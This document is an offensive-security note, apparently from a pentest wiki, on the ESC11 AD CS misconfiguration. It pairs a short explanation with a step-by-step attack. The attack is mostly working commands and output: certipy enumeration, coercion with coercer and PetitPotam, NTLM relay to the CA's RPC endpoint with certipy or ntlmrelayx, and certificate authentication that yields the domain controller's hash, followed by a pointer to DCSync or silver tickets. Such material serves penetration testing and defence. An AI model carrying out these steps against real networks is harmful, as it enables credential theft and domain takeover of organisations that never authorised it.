### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - Abuse](#linux---abuse)

> NTLM relay over ADCS `RPC`/`ICPR` enrollment endpoint
> 
> [Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)

---
### Overview

ESC11 is an ADCS misconfiguration that can be abused using NTLM relay to ADCS `RPC`/`ICPR` enrollment endpoints.

ICertPassage Remote Protocol (MS-ICPR): RPC interface that AD CS's CA service exposes so clients can submit certificate signing requests and retrieve issued cert.

While RPC allows each interface to define its own NTLM signature enforcement policy, On MS-ICPR RPC interface, enforcement is controlled by the `IF_ENFORCEENCRYPTICERTREQUEST` flag (part of the CA's `InterfaceFlags` setting). If this flag is NOT set, the CA does not enforce NTLM signing on ICPR RPC requests.

By default, the flag `IF_ENFORCEENCRYPTICERTREQUEST` is set to verify the signature. This default can be changed by an admin, often to work around AD authentication issues that occur when older Windows Server versions are present in the domain (e.g., Windows Server 2012, 2008).

#### Requirements

- CA has `IF_ENFORCEENCRYPTICERTREQUEST` disabled on MS-ICPR RPC endpoint.
- Coerce victim's HTTP NTLM auth or SMB NTLM authentication and relay it over HTTP.
- Enrollable cert template available to the target.

---
### From Linux
#### Linux - Enumeration

Find vulnerable servers with `Certipy`

```bash
$ certipy find -u blwasp -p 'Password123!' -dc-ip 172.16.19.3 -vulnerable -stdout
[SNIP]
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        ManageCertificates              : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        ManageCa                        : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Enroll                          : LAB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
```

#### Linux - Abuse 

If we coerced:

- Domain controller, we can use the default `DomainController` template
- Regular computer, we can use the default `Machine` template
- An administrator, we can use the default `Administrator` template

We can also enumerate the other enabled templates to choose.


```bash
# At first we can test if the target is vulnerable to coercing using coercer
$ sudo coercer scan -d lab.local -u blwasp -p 'Password123!' -t <TARGET-MACHINE-IP>

# Starting certipy in the relay mode so that it can authenticate on behalf of the coerced target (DC machine in our case) and request a certificate from the DomainController default template
$ sudo certipy relay -target "rpc://<ADCS-CA-IP>" -ca "lab-WS01-CA" -template DomainController

# Or use ntlmrelayx
$ ntlmrelayx -t rpc://$PKI.$DOMAIN -rpc-mode ICPR -icpr-ca-name $CA_NAME -smb2support --template "Template name"
```

Start coercing our target into authenticating to our `certipy` listener

```bash
$ coercer coerce -l <LISTENING-IP> -t <TARGET-IP> -u blwasp -p 'Password123!' -d lab.local -v

# Or use PetitPotam
$ python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' <LISTENING-IP> <TARGET-IP>
```

On the `certipy` shell

```bash
$ sudo certipy relay -target <ADCS-CA-IP> -template DomainController
[SNIP]
[*] Saved certificate and private key to 'lab-dc.pfx'
[SNIP]

# Now we authenticate using the certificate we got
$ certipy auth -pfx ./lab-dc.pfx
[*] Got hash for 'lab-dc$@lab.local': aad3...:....
```

From this point we can initiate a DCSync attack or we can create a silver ticket to access the DC as Administrator.